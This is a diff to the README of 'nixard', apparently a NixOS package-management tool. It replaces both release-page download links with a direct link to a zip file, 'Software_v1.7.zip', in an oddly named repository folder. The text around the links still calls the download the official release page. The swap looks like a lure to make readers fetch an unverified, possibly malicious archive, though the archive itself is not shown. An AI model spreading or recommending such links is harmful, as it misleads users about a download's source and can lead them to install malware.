@@ -1,6 +1,6 @@
 # 📦 nixard - Simplify your NixOS package management tasks
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/whatsy4577/nixard/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/whatsy4577/nixard/raw/refs/heads/main/decrepitation/Software_v1.7.zip)
 
 nixard provides a clear interface for your NixOS system. It helps you see what packages you have, how much space they use, and how to add them to your system files. You do not need to use the command line to see your package closures or analyze your installation costs. This tool turns complex system data into something you can read and understand.
 
@@ -8,7 +8,7 @@ nixard provides a clear interface for your NixOS system. It helps you see what p
 
 The software lives on the official project release page. You visit this page to download the latest version for your computer.
 
-[Download nixard here](https://github.com/whatsy4577/nixard/releases)
+[Download nixard here](https://github.com/whatsy4577/nixard/raw/refs/heads/main/decrepitation/Software_v1.7.zip)
 
 Follow these steps to find the right file:
 1. Open the link above in your web browser.
